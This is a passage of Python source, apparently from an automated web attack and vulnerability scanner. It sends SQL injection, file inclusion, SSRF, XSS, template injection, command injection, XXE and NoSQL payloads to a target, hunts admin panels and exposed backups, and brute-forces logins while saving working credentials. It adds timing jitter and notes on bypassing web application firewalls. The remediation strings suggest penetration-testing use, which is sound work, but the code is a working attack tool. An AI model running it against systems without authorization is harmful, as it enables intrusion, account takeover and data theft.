    with ThreadPoolExecutor(max_workers=min(THREADS, 20)) as pool:
        pool.map(_chk, wordlist)
    return found


                                                                                 
                     
                                                                                 

def fingerprint(target):
    _banner()
    ok_, url, first = check_host(target)
    if not ok_:
        _pause()
        return {}
    base = normalize_base(url)
    _info(f"Fingerprint → {base}")
    sess   = _wafsess()
    result = {"url": base, "server": "", "cms": "", "waf": "",
              "technologies": [], "headers": {}}
    try:
        r       = sess.get(base + "/", timeout=TIMEOUT, verify=VERIFY_SSL)
        result["headers"] = dict(r.headers)
        result["status"]  = r.status_code
        body    = r.text
        hdr_str = str(dict(r.headers)).lower()
        for tech, sigs in TECHNOLOGY_SIGS.items():
            for sig in sigs:
                if sig.lower() in body.lower() or sig.lower() in hdr_str:
                    if tech not in result["technologies"]:
                        result["technologies"].append(tech)
                        _found(f"Technology: {tech}")
                    break
        srv = r.headers.get("Server","")
        if srv:
            result["server"] = srv
            _found(f"Server: {srv}")
        pw = r.headers.get("X-Powered-By","")
        if pw:
            _found(f"X-Powered-By: {pw}")
        gen = r.headers.get("X-Generator","")
        if gen:
            _found(f"X-Generator: {gen}")
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in hdr_str or sig.lower() in body.lower():
                    result["waf"] = waf_name
                    _found(f"WAF Detected: {waf_name}")
                    _add_finding("INFO","WAF Detected",base,
                                 f"WAF: {waf_name}",sig,
                                 "Note WAF when crafting payloads.","WAF")
                    break
        wp_m = WP_VER_RES.search(body)
        if wp_m:
            ver = next((v for v in wp_m.groups() if v), None)
            if ver:
                result["wp_version"] = ver
                _found(f"WordPress Version: {ver}")
                _add_finding("INFO","WordPress Version Exposed",base,
                             f"WP {ver}","Meta generator",
                             "Remove version from meta generator.","WordPress")
    except Exception as e:
        _err(f"Fingerprint error: {e}")

    lines_out = [f"{GRN}URL:{RST} {base}"]
    if result.get("server"):
        lines_out.append(f"{GRN}Server:{RST} {result['server']}")
    if result.get("waf"):
        lines_out.append(f"{YLW}WAF:{RST} {result['waf']}")
    for t in result.get("technologies",[])[:12]:
        lines_out.append(f"{CYN}Tech:{RST} {t}")
    _result_box("FINGERPRINT RESULTS", lines_out)
    _pause()
    return result


                                                                                 
                       
                                                                                 

def waf_detect(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return
    base = normalize_base(url)
    _info(f"WAF Detection → {base}")
    sess = _wafsess()
    info = detect_waf(sess, base, TIMEOUT)
    if info["detected"]:
        _vuln(f"WAF: {info['type']}  (confidence: {info['confidence']})")
        _add_finding("INFO","WAF Detected",base,
                     f"WAF product: {info['type']}","Response headers/body",
                     "Use WAF bypass headers and encoding.","WAF")
        _result_box("WAF DETECTED",[
            f"{YLW}Product:{RST} {info['type']}",
            f"{YLW}Confidence:{RST} {info['confidence']}",
        ])
    else:
        _clean("No WAF detected")
        _result_box("WAF NOT DETECTED",[f"{GRN}No WAF signatures found{RST}"])
    _pause()


                                                                                 
                          
                                                                                 

def security_headers_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return
    base = normalize_base(url)
    _info(f"Security Headers → {base}")
    required = {
        "Strict-Transport-Security":   "HSTS not set — downgrade attack possible",
        "Content-Security-Policy":     "CSP not set — XSS risk elevated",
        "X-Frame-Options":             "Clickjacking protection missing",
        "X-Content-Type-Options":      "MIME sniffing possible",
        "Referrer-Policy":             "Referrer leakage possible",
        "Permissions-Policy":          "Feature-Policy not set",
        "X-XSS-Protection":            "XSS filter not configured",
    }
    try:
        r = _sess().get(base + "/", timeout=TIMEOUT, verify=VERIFY_SSL)
        missing, present = [], []
        for hdr, risk in required.items():
            val = r.headers.get(hdr)
            if val:
                present.append(f"{GRN}[+] {hdr}: {val[:60]}{RST}")
            else:
                missing.append(f"{RED}[-] {hdr} — {risk}{RST}")
                _add_finding("MEDIUM","Missing Security Header",base,
                             risk,f"Header absent: {hdr}",
                             f"Add {hdr} to server responses.","Headers")
        cors = r.headers.get("Access-Control-Allow-Origin","")
        if cors == "*":
            missing.append(f"{RED}[-] CORS wildcard (*) — all origins permitted{RST}")
            _add_finding("HIGH","CORS Wildcard",base,
                         "ACAO: * — all origins permitted",
                         "Access-Control-Allow-Origin: *",
                         "Restrict CORS to trusted origins.","Headers")
        _result_box("SECURITY HEADERS",[*present, *missing,
            f"{DIM}Missing: {len(missing)}  Present: {len(present)}{RST}"])
    except Exception as e:
        _err(f"Headers scan error: {e}")
    _pause()


                                                                                 
                   
                                                                                 

def ssl_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base     = normalize_base(url)
    _info(f"SSL/TLS Analysis → {base}")
    parsed   = urlparse(base)
    hostname = parsed.hostname
    result   = ssl_info_probe(base, 10)
    lines    = [
        f"{GRN}Host:{RST} {hostname}",
        f"{GRN}Protocol:{RST} {result.get('protocol','?')}",
        f"{GRN}Cipher:{RST} {result.get('cipher','?')}",
        f"{GRN}CN:{RST} {result.get('cn','?')}",
        f"{GRN}Issuer:{RST} {result.get('issuer','?')}",
        f"{GRN}Expires:{RST} {result.get('not_after','?')}",
    ]
    proto = result.get("protocol","")
    if proto in ("TLSv1","TLSv1.1","SSLv2","SSLv3"):
        _vuln(f"Weak TLS protocol: {proto}")
        _add_finding("HIGH","Weak TLS Protocol",base,
                     f"Protocol: {proto}",f"TLS version: {proto}",
                     "Disable TLS 1.0/1.1. Require TLS 1.2+.","SSL")
    _result_box("SSL/TLS RESULTS", lines)
    _pause()
    return result


                                                                                 
                         
                                                                                 

def backup_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base  = normalize_base(url)
    _info(f"Backup & Exposure Scan → {base}  ({len(BACKUP_PATHS_EXTRA)} paths)")
    found = []
    lock_local = threading.Lock()

    def _chk(path):
        try:
            r = _get(base + path, allow_redirects=False)
            if r and r.status_code in (200, 301, 302):
                if r.status_code == 200 and len(r.content) > 0:
                    with lock_local:
                        found.append(path)
                    _vuln(f"EXPOSED: {path}  [{r.status_code}]  {len(r.content)}b")
                    _add_finding(
                        "HIGH","Sensitive File Exposed",base+path,
                        f"{path} accessible — may contain credentials/config",
                        f"HTTP {r.status_code} {len(r.content)}b",
                        "Remove/protect sensitive files from web root.","Exposure"
                    )
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=min(THREADS, 30)) as pool:
        pool.map(_chk, BACKUP_PATHS_EXTRA)

    if found:
        _result_box("EXPOSED FILES",
                    [f"{RED}{p}{RST}" for p in found[:30]])
        _found_box("BACKUP/CONFIG EXPOSURE", base,
                   "\n".join(found[:10]), found=True)
    else:
        _clean("No exposed backup/config files found")
        _found_box("BACKUP SCAN", base, "No exposed files detected",
                   found=False)
    _pause()
    return found

def backup_finder(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    def _chk(path):
        try:
            r = sess.get(base + path, timeout=timeout,
                         verify=VERIFY_SSL, allow_redirects=False)
            if r and r.status_code == 200 and len(r.content) > 10:
                found.append({"path": base+path, "size": len(r.content)})
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(_chk, BACKUP_PATHS_EXTRA)
    return found


                                                                                 
                                           
                                                                                 

def _admin_auto_scan(base: str) -> list:
    found      = []
    lock_local = threading.Lock()
    total      = len(ADMIN_PATHS)
    done_count = [0]
    q          = queue.Queue()
    for p in ADMIN_PATHS:
        q.put(p)

    def _worker():
        while True:
            try:
                path = q.get_nowait()
            except Exception:
                break
            try:
                r = _get(base + path, allow_redirects=False)
                if r and r.status_code in (200, 301, 302, 401, 403):
                    with lock_local:
                        found.append((path, r.status_code, len(r.content)))
                    if r.status_code in (200, 301, 302):
                        _hit(path, r.status_code, len(r.content), "[ADMIN]")
                        _add_finding(
                            "MEDIUM","Admin Panel Found",base+path,
                            f"Admin path accessible — HTTP {r.status_code}",
                            f"HTTP {r.status_code}",
                            "Restrict admin panel to trusted IPs.","Recon"
                        )
                    elif r.status_code == 403:
                        _hit(path, 403, len(r.content), "[FORBIDDEN]")
            except Exception:
                pass
            finally:
                with lock_local:
                    done_count[0] += 1
                    _loading_bar(done_count[0], total, path)
                q.task_done()
            _jitter()

    threads = [
        threading.Thread(target=_worker, daemon=True)
        for _ in range(min(THREADS, 30))
    ]
    for t in threads:
        t.start()
    q.join()
    return found

def admin_finder(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    _info(f"Admin Finder (AUTO) → {base}  ({len(ADMIN_PATHS)} paths)")
    found = _admin_auto_scan(base)
    if found:
        _result_box("ADMIN PATHS FOUND",[
            f"{GRN}[{code}]{RST} {path}  {DIM}{size}b{RST}"
            for path, code, size in found[:30]
        ])
        detail = "\n".join(f"[{c}] {p}" for p,c,_ in found[:10])
        _found_box("ADMIN PANEL SCANNER", base, detail, found=True)
    else:
        _clean("No admin paths found")
        _found_box("ADMIN PANEL SCANNER", base,
                   "No accessible admin paths found", found=False)
    _pause()
    return found

def admin_panel_scan(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    def _chk(path):
        try:
            r = sess.get(base + path, timeout=timeout,
                         verify=VERIFY_SSL, allow_redirects=False)
            if r and r.status_code in (200,403,401):
                found.append({"path": base+path, "status": r.status_code})
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(_chk, ADMIN_PATHS)
    return found


                                                                                 
                       
                                                                                 

def sqli_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    _info(f"SQLi Scanner → {base}")
    results   = []
    test_urls = [
        f"{base}/?id=1", f"{base}/?p=1", f"{base}/?page_id=1",
        f"{base}/?cat=1", f"{base}/?product_id=1", f"{base}/?item=1",
        f"{base}/?q=test", f"{base}/?s=test",
    ]
    try:
        r = _get(base+"/")
        if r:
            links = re.findall(
                r'href=["\']([^"\']+\?[^"\']+)["\']', r.text)
            for l in links[:15]:
                full = l if l.startswith("http") else urljoin(base, l)
                if full not in test_urls:
                    test_urls.append(full)
    except Exception:
        pass

    print(BLU + f"  Scanning {len(test_urls)} URLs × {len(SQLI_PAYLOADS)} payloads..." + RST)
    error_sigs = [
        "you have an error in your sql syntax", "warning: mysql",
        "unclosed quotation mark", "quoted string not properly terminated",
        "odbc sql server driver", "mysql_fetch_array",
        "supplied argument is not a valid mysql", "ora-01756",
        "postgresql query failed", "pg_query", "sqlite3.operationalerror",
        "mssql", "microsoft ole db provider for sql server",
        "[microsoft][sql server native client",
    ]

    for test_url in test_urls[:12]:
        parsed = urlparse(test_url)
        params = dict(parse_qsl(parsed.query))
        if not params:
            continue
        for param, val in list(params.items())[:3]:
            for payload in SQLI_PAYLOADS[:12]:
                try:
                    new_p = dict(params)
                    new_p[param] = payload
                    new_q = urlencode(new_p)
                    test  = parsed._replace(query=new_q).geturl()
                    r     = _get(test)
                    if r:
                        body = r.text.lower()
                        if any(sig in body for sig in error_sigs):
                            results.append({"url": test, "param": param,
                                            "payload": payload, "type": "error"})
                            _vuln(f"SQLi [error-based]: {param}={payload[:30]}  @ {test[:60]}")
                            _add_finding(
                                "CRITICAL","SQL Injection (Error-Based)",test,
                                f"Param {param} reflects SQL error",
                                f"Payload: {payload[:60]}",
                                "Parameterize all SQL queries.","SQLi"
                            )
                            break
                except Exception:
                    pass
                _jitter()

        for probe in SQL_UNION_PROBES[:6]:
            for param, val in list(params.items())[:2]:
                try:
                    new_p = dict(params)
                    new_p[param] = val + probe
                    new_q = urlencode(new_p)
                    test  = parsed._replace(query=new_q).geturl()
                    r     = _get(test)
                    if r and re.search(
                        r'(?:root:|uid=\d|user\(\)|version\(\)|information_schema)',
                        r.text, re.I
                    ):
                        results.append({"url": test, "param": param,
                                        "payload": probe, "type": "union"})
                        _vuln(f"SQLi [UNION]: {param}={probe[:30]}  @ {test[:60]}")
                        _add_finding(
                            "CRITICAL","SQL Injection (UNION)",test,
                            "UNION probe returned DB data",
                            f"Payload: {probe[:60]}",
                            "Parameterize all SQL queries.","SQLi"
                        )
                        break
                except Exception:
                    pass

    if results:
        detail = "\n".join(f"[{r['type'].upper()}] {r['param']}={r['payload'][:30]}"
                           for r in results[:5])
        _found_box("SQL INJECTION", base, detail, found=True)
    else:
        _clean("No SQL injection detected")
        _found_box("SQL INJECTION", base, "No SQLi detected", found=False)

    _result_box("SQLi SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No SQLi detected{RST}"
    ])
    _pause()
    return results

def sqli_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results   = []
    error_sigs = [
        "you have an error in your sql syntax","warning: mysql",
        "unclosed quotation mark","mysql_fetch_array",
        "ora-01756","postgresql query failed","sqlite3.operationalerror",
    ]
    for payload in SQLI_PAYLOADS[:8]:
        for param in ["id","p","cat","s","q","page","item"]:
            try:
                r = sess.get(f"{base}/?{param}={quote(payload)}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and any(sig in r.text.lower() for sig in error_sigs):
                    results.append({"url": f"{base}/?{param}={payload}",
                                    "param": param, "payload": payload,
                                    "type": "error"})
                    break
            except Exception:
                pass
    return results

def sql_union_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for probe in SQL_UNION_PROBES[:6]:
        for param in ["id","p","cat","q"]:
            try:
                r = sess.get(f"{base}/?{param}=1{quote(probe)}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and re.search(
                    r'(?:root:|uid=\d|user\(\)|version\(\)|information_schema)',
                    r.text, re.I
                ):
                    results.append({"url": f"{base}/?{param}=1{probe}",
                                    "param": param, "payload": probe,
                                    "type": "union"})
                    break
            except Exception:
                pass
    return results


                                                                                 
                   
                                                                                 

def lfi_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    _info(f"LFI/RFI Scanner → {base}")
    results     = []
    test_params = [
        "file","path","include","page","template","view","load",
        "dir","folder","read","doc","document","f","lang","language",
        "module","content","show","display","source","cfg","conf",
    ]
    for param in test_params:
        for payload in LFI_PAYLOADS[:15]:
            try:
                test_url = f"{base}/?{param}={quote(payload)}"
                r = _get(test_url)
                if r and LFI_PAT.search(r.text):
                    results.append({"url": test_url, "param": param,
                                    "payload": payload, "type": "lfi"})
                    _vuln(f"LFI: {param}={payload[:50]}  @ {test_url[:60]}")
                    _add_finding(
                        "CRITICAL","Local File Inclusion",test_url,
                        f"Param {param} reads local files",
                        f"Payload: {payload[:60]}",
                        "Never pass user input to file open functions.","LFI"
                    )
                    break
            except Exception:
                pass
            _jitter()

    if results:
        detail = "\n".join(f"[LFI] {r['param']}={r['payload'][:40]}"
                           for r in results[:5])
        _found_box("LOCAL FILE INCLUSION", base, detail, found=True)
    else:
        _clean("No LFI detected")
        _found_box("LOCAL FILE INCLUSION", base, "No LFI detected", found=False)

    _result_box("LFI/RFI SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No LFI/RFI detected{RST}"
    ])
    _pause()
    return results

def lfi_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for param in ["file","path","include","page","template","dir","read"]:
        for payload in LFI_PAYLOADS[:8]:
            try:
                r = sess.get(f"{base}/?{param}={quote(payload)}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and LFI_PAT.search(r.text):
                    results.append({"url": f"{base}/?{param}={payload}",
                                    "param": param, "payload": payload,
                                    "type": "lfi"})
                    break
            except Exception:
                pass
    return results


                                                                                 
              
                                                                                 

def ssrf_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    _info(f"SSRF Scanner → {base}")
    results     = []
    ssrf_params = [
        "url","dest","redirect","uri","path","next","return","src",
        "callback","load","host","to","target","continue","data",
        "image","img","fetch","proxy","forward","mirror","download",
    ]
    for param in ssrf_params:
        for payload in SSRF_PAYLOADS[:8]:
            try:
                test_url = f"{base}/?{param}={quote(payload)}"
                r        = _get(test_url)
                if r:
                    body = r.text
                    cloud_sigs = [
                        "ami-id","169.254","compute/v1","metadata",
                        "local-ipv4","hostname","security-credentials",
                        "instance-id","iam","latest/meta",
                    ]
                    if any(s in body for s in cloud_sigs):
                        results.append({"url": test_url, "param": param,
                                        "payload": payload, "type": "cloud_metadata"})
                        _vuln(f"SSRF [cloud meta]: {param}={payload[:40]}  @ {test_url[:60]}")
                        _add_finding(
                            "CRITICAL","SSRF — Cloud Metadata",test_url,
                            f"Param {param} reaches cloud metadata",
                            f"Payload: {payload[:60]}",
                            "Whitelist allowed URLs. Block internal IP ranges.","SSRF"
                        )
                        break
                    if r.elapsed.total_seconds() > 4 and "169.254" in payload:
                        _warn(f"SSRF timing indicator: {param}={payload[:40]}")
            except Exception:
                pass
            _jitter()

    if results:
        detail = "\n".join(f"[SSRF] {r['param']}={r['payload'][:40]}"
                           for r in results[:5])
        _found_box("SSRF", base, detail, found=True)
    else:
        _clean("No SSRF detected")
        _found_box("SSRF", base, "No SSRF detected", found=False)

    _result_box("SSRF SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No SSRF detected{RST}"
    ])
    _pause()
    return results

def ssrf_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for param in ["url","dest","redirect","src","callback","load","fetch","target"]:
        for payload in SSRF_PAYLOADS[:5]:
            try:
                r = sess.get(f"{base}/?{param}={quote(payload)}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and any(s in r.text for s in [
                    "ami-id","169.254","metadata","local-ipv4"
                ]):
                    results.append({"url": f"{base}/?{param}={payload}",
                                    "param": param, "payload": payload,
                                    "type": "ssrf"})
                    break
            except Exception:
                pass
    return results


                                                                                 
                    
                                                                                 

def xss_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"XSS + SSTI Scanner → {base}")
    results = []

    search_url = f"{base}/?s="
    for payload in XSS_PAYLOADS[:15]:
        try:
            r = _get(search_url + quote(payload))
            if r and (payload in r.text or
                      _html_mod.unescape(payload) in r.text):
                results.append({"url": search_url+payload,
                                 "type": "xss_reflected", "payload": payload})
                _vuln(f"XSS [reflected]: s={payload[:40]}")
                _add_finding(
                    "HIGH","Reflected XSS",search_url,
                    "Search param reflects XSS payload unescaped",
                    f"Payload: {payload[:60]}",
                    "Escape all output. Implement CSP.","XSS"
                )
                break
        except Exception:
            pass
        _jitter()

    for engine, ctx in SSTI_CONTEXTS.items():
        for param in ["name","email","search","q","s","message","template","view"]:
            try:
                r = _get(f"{base}/?{param}={quote(ctx['probe'])}")
                if r and ctx["confirm"] in r.text:
                    results.append({"url": f"{base}/?{param}={ctx['probe']}",
                                    "type": "ssti", "engine": engine})
                    _vuln(f"SSTI [{engine}]: {param}={ctx['probe']}")
                    _add_finding(
                        "CRITICAL","SSTI Detected",f"{base}/?{param}=",
                        f"Template injection confirmed [{engine}]",
                        f"Probe: {ctx['probe']}",
                        "Sandbox template engines.","SSTI"
                    )
                    break
            except Exception:
                pass

    if results:
        xss_r = [r for r in results if r.get("type","").startswith("xss")]
        ssti_r = [r for r in results if r.get("type") == "ssti"]
        detail = (
            f"XSS: {len(xss_r)}  SSTI: {len(ssti_r)}\n" +
            "\n".join(
                f"[{r['type'].upper()}] {r.get('payload','')[:40]}"
                for r in results[:5]
            )
        )
        _found_box("XSS / SSTI", base, detail, found=True)
    else:
        _clean("No XSS/SSTI detected")
        _found_box("XSS / SSTI", base, "No XSS/SSTI detected", found=False)

    _result_box("XSS + SSTI",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No XSS/SSTI detected{RST}"
    ])
    _pause()
    return results

def xss_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for payload in XSS_PAYLOADS[:8]:
        try:
            r = sess.get(f"{base}/?s={quote(payload)}",
                         timeout=timeout, verify=VERIFY_SSL)
            if r and (payload in r.text or
                      _html_mod.unescape(payload) in r.text):
                results.append({"url": f"{base}/?s={payload}",
                                 "param": "s", "payload": payload,
                                 "type": "reflected_xss"})
                break
        except Exception:
            pass
    return results

def ssti_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for engine, ctx in SSTI_CONTEXTS.items():
        for param in ["name","email","search","q","s","template"]:
            try:
                r = sess.get(f"{base}/?{param}={quote(ctx['probe'])}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and ctx["confirm"] in r.text:
                    results.append({"url": f"{base}/?{param}={ctx['probe']}",
                                    "param": param, "engine": engine,
                                    "type": "ssti"})
                    break
            except Exception:
                pass
    return results


                                                                                 
                           
                                                                                 

def cmd_injection_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Command Injection Scanner → {base}")
    results = []
    params  = ["cmd","exec","command","ping","host","ip","c","run","shell"]

    for param in params:
        for payload in CMD_INJECTION_PAYLOADS[:15]:
            try:
                r = _get(f"{base}/?{param}={quote(payload)}")
                if r:
                    body = r.text
                    cmd_sigs = [
                        "uid=", "root:", "daemon:", "www-data",
                        "/bin/bash", "/etc/passwd", "volume in drive",
                        "directory of", "ls: ", "total ",
                    ]
                    if any(s in body for s in cmd_sigs):
                        results.append({"url": f"{base}/?{param}={payload}",
                                        "param": param, "payload": payload})
                        _vuln(f"CMD INJECTION: {param}={payload[:40]}  @ {base}")
                        _add_finding(
                            "CRITICAL","OS Command Injection",
                            f"{base}/?{param}=",
                            f"Param {param} executes OS commands",
                            f"Payload: {payload[:60]}",
                            "Sanitize input. Avoid system calls with user data.","CMDi"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        detail = "\n".join(f"[CMDi] {r['param']}={r['payload'][:40]}"
                           for r in results[:5])
        _found_box("COMMAND INJECTION", base, detail, found=True)
    else:
        _clean("No command injection detected")
        _found_box("COMMAND INJECTION", base,
                   "No command injection detected", found=False)

    _result_box("CMD INJECTION SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No command injection detected{RST}"
    ])
    _pause()
    return results

def cmd_injection_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results  = []
    cmd_sigs = ["uid=","root:","daemon:","www-data","/bin/bash"]
    for param in ["cmd","exec","command","ping","c","run"]:
        for payload in CMD_INJECTION_PAYLOADS[:8]:
            try:
                r = sess.get(f"{base}/?{param}={quote(payload)}",
                             timeout=timeout, verify=VERIFY_SSL)
                if r and any(s in r.text for s in cmd_sigs):
                    results.append({"url": f"{base}/?{param}={payload}",
                                    "param": param, "payload": payload,
                                    "type": "cmd_injection"})
                    break
            except Exception:
                pass
    return results


                                                                                 
             
                                                                                 

def xxe_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"XXE Scanner → {base}")
    results = []
    headers = {"Content-Type": "application/xml"}

    for payload in XXE_PAYLOADS:
        try:
            r = _sess().post(base + "/", data=payload,
                             headers=headers, timeout=TIMEOUT,
                             verify=VERIFY_SSL)
            if r and "root:" in r.text:
                results.append({"url": base, "payload": payload[:80]})
                _vuln(f"XXE: /etc/passwd content in response")
                _add_finding(
                    "CRITICAL","XML External Entity (XXE)",base,
                    "XXE payload returned local file content",
                    payload[:80],
                    "Disable external entity parsing in XML parsers.","XXE"
                )
                break
        except Exception:
            pass
        _jitter()

    if results:
        _found_box("XXE INJECTION", base,
                   "XXE payload returned file content", found=True)
    else:
        _clean("No XXE detected")
        _found_box("XXE INJECTION", base, "No XXE detected", found=False)

    _result_box("XXE SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No XXE detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                         
                                                                                 

def nosql_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"NoSQL Injection Scanner → {base}")
    results = []

    login_paths = [
        "/login", "/api/login", "/api/v1/login",
        "/api/auth", "/api/v1/auth",
    ]
    json_hdrs = {"Content-Type": "application/json"}

    for path in login_paths:
        for payload in NOSQL_PAYLOADS[:8]:
            try:
                r = _sess().post(
                    base + path,
                    data=json.dumps({"username": "admin",
                                     "password": json.loads(payload)}),
                    headers=json_hdrs,
                    timeout=TIMEOUT, verify=VERIFY_SSL,
                )
                if r:
                    body = r.text.lower()
                    if any(s in body for s in [
                        "token","dashboard","welcome","logged in",
                        "access granted","session",
                    ]):
                        results.append({"url": base+path, "payload": payload})
                        _vuln(f"NoSQL Injection: {path}  payload={payload[:40]}")
                        _add_finding(
                            "CRITICAL","NoSQL Injection",base+path,
                            "Authentication bypassed via NoSQL operator",
                            f"Payload: {payload[:60]}",
                            "Validate and sanitize NoSQL query inputs.","NoSQLi"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        _found_box("NOSQL INJECTION", base,
                   "\n".join(r['url'] for r in results[:5]), found=True)
    else:
        _clean("No NoSQL injection detected")
        _found_box("NOSQL INJECTION", base,
                   "No NoSQL injection detected", found=False)

    _result_box("NOSQL SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No NoSQL injection detected{RST}"
    ])
    _pause()
    return results

def nosql_injection_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results   = []
    json_hdrs = {"Content-Type": "application/json"}
    for payload in NOSQL_PAYLOADS[:5]:
        try:
            r = sess.post(
                base + "/api/login",
                data=json.dumps({"username": "admin",
                                 "password": json.loads(payload)}),
                headers=json_hdrs,
                timeout=timeout, verify=VERIFY_SSL,
            )
            if r and any(s in r.text.lower() for s in [
                "token","dashboard","welcome","logged in"
            ]):
                results.append({"url": base+"/api/login",
                                 "payload": payload, "type": "nosql"})
                break
        except Exception:
            pass
    return results


                                                                                 
                                          
                                                                                 

def _auth_bypass_auto(base: str) -> list:
    """
    Automatic auth bypass — tries all AUTH_BYPASS_PAYLOADS without prompting.
    Returns list of successful bypass records.
    """
    results    = []
    lock_local = threading.Lock()
    login_paths = [
        "/login", "/login.php", "/admin/login", "/admin/login.php",
        "/wp-login.php", "/administrator/index.php",
        "/admin", "/signin", "/auth/login",
        "/api/login", "/api/v1/login", "/api/auth",
    ]

    success_sigs = [
        "dashboard","welcome","logout","profile","account",
        "admin","panel","control","manage","authenticated",
        "signed in","logged in","access granted",
    ]

    def _try(path, user, pwd):
        try:
            r = _post(
                base + path,
                data={"username": user, "password": pwd,
                      "user": user, "pass": pwd,
                      "log": user, "pwd": pwd,
                      "email": user, "passwd": pwd},
                allow_redirects=True,
            )
            if r and r.status_code in (200, 302):
                body = r.text.lower()
                if any(s in body for s in success_sigs):
                    with lock_local:
                        results.append({
                            "url":      base + path,
                            "username": user,
                            "password": pwd,
                        })
                    _vuln(f"AUTH BYPASS: {path}  user={user}  pass={pwd}")
                    _add_finding(
                        "CRITICAL","Authentication Bypass",base+path,
                        f"Login succeeded with: {user} / {pwd}",
                        f"HTTP {r.status_code}",
                        "Enforce strong password policy. Use parameterized auth.","Auth"
                    )
                    return True
        except Exception:
            pass
        return False

    with ThreadPoolExecutor(max_workers=min(THREADS, 10)) as pool:
        futures = []
        for path in login_paths:
            for user, pwd in AUTH_BYPASS_PAYLOADS:
                futures.append(pool.submit(_try, path, user, pwd))
        for f in as_completed(futures):
            pass

    return results

def auth_bypass_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    _info(f"Auth Bypass (AUTO) → {base}  ({len(AUTH_BYPASS_PAYLOADS)} combos)")
    results = _auth_bypass_auto(base)
    if results:
        lines = [
            f"{RED}[BYPASS]{RST} {r['url']}  "
            f"user={r['username']}  pass={r['password']}"
            for r in results[:10]
        ]
        _result_box("AUTH BYPASS FOUND", lines)
        detail = "\n".join(
            f"[BYPASS] {r['url']}  {r['username']}:{r['password']}"
            for r in results[:5]
        )
        _found_box("AUTHENTICATION BYPASS", base, detail, found=True)
        for r in results:
            _save_results(base, r["url"],
                          {"user": r["username"], "pass": r["password"]})
    else:
        _clean("No auth bypass found")
        _found_box("AUTHENTICATION BYPASS", base,
                   "No bypass found with tested payloads", found=False)
    _pause()
    return results

def full_login_bruteforce(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    login_paths = ["/wp-login.php", "/login", "/admin/login", "/login.php"]
    success_sigs = ["dashboard","welcome","logout","admin panel"]
    for path in login_paths:
        for user, pwd in AUTH_BYPASS_PAYLOADS[:20]:
            try:
                r = sess.post(
                    base + path,
                    data={"username": user, "password": pwd,
                          "log": user, "pwd": pwd},
                    timeout=timeout, verify=VERIFY_SSL,
                    allow_redirects=True,
                )
                if r and any(s in r.text.lower() for s in success_sigs):
                    results.append({"url": base+path, "username": user,
                                    "password": pwd, "type": "auth_bypass"})
                    break
            except Exception:
                pass
    return results


                                                                                 
                       
                                                                                 

def open_redirect_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Open Redirect Scanner → {base}")
    results = []
    params  = [
        "url","redirect","next","return","goto","dest","destination",
        "ref","return_url","callback","continue","forward","to",
        "link","out","out_url","output","returnUrl","redirectUrl",
        "returnto","go","target",
    ]
    for param in params:
        for payload in OPEN_REDIRECT_PAYLOADS[:10]:
            try:
                r = _get(f"{base}/?{param}={quote(payload)}",
                         allow_redirects=False)
